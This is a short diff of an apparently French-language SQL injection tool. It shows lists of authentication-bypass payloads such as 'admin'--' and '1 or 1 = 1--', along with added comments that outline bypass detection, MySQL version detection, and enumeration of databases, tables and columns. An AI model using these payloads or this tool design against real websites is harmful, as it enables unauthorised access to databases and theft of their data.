@@ -14,9 +14,22 @@ l_bypass = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 
 l_bypass2 = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2", "') and '1'='2'--"]
 alphabet = "abcdefghijklmnopqrstuvwxyz"
 
-# --------- Fonctions ------------
+# --------- Arguments ----------
+'''
+URL         URL a injecter
+Bypass      Détecter le bypass à utiliser
 
-# Arguments
+'''
+
+# --------- Fonctions ------------
+'''
+    Détection du bypass à utiliser pour l'injection
+    Détection de la version de MySQL
+    Récupération de la base de donnée en cours d'utilisation
+    Enumérer bases de données
+    Enumérer les tables
+    Enumérer les colonnes
+'''
 """def main(argv):
 # ---- /!\
    try:
